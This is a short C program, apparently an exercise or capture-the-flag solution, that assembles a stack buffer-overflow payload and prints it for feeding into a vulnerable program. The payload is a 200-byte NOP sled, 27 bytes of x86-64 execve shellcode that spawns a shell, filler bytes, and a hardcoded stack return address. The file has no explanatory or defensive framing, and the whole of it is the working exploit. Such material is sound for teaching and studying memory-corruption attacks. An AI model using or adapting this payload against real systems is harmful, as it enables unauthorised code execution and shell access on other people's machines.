#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP 0x90

char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
char addr[] = "\xf0\xe7\xff\xff\xff\x7f\x00\x00";

void main() {
    char buff[299] = {0};

    // 200 NOP sled @ 0-199
    for (int i = 0; i < 200; i++) {
        buff[i] = 0x90;
    }
    // 27 shellcode @ 200-226
    for (int i = 200; i < 227; i++) {
        buff[i] = shellcode[i-200];
    }
    // 63 filler @ 227-289
    for (int i = 227; i < 290; i++) {
        buff[i] = NOP;
    }
    // 8 addr @ 290-297
    for (int i = 290; i < 298; i++) {
        buff[i] = addr[i - 290];
    }
    buff[298] = '\0';
    printf(buff);
}